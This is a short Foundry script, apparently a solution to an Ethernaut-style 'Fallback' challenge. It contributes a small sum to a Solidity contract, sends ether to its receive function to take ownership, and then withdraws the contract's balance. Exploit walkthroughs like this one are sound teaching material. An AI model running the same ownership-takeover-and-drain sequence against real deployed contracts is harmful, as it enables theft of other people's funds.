//SPDX-License-Identifier: MIT

import {Fallback_sol} from "../../src/Fallback.sol";
import {Script,console} from "forge-std/Script.sol";

pragma solidity ^0.8.18;

contract HackFallback is Script{

    Fallback_sol fallback_sol;

    function run() public {
        fallback_sol = Fallback_sol(payable(0x5184C74CE184A8df6275DB0feC0B01A32Cf7bfDe));

        vm.startBroadcast();

        fallback_sol.contribute{value: 0.0001 ether}();
        (bool s,) = address(fallback_sol).call{value: 0.0001 ether}("");
        require(s, "Receive() Function Failed");
        fallback_sol.withdraw();
        vm.stopBroadcast();
    }

}  

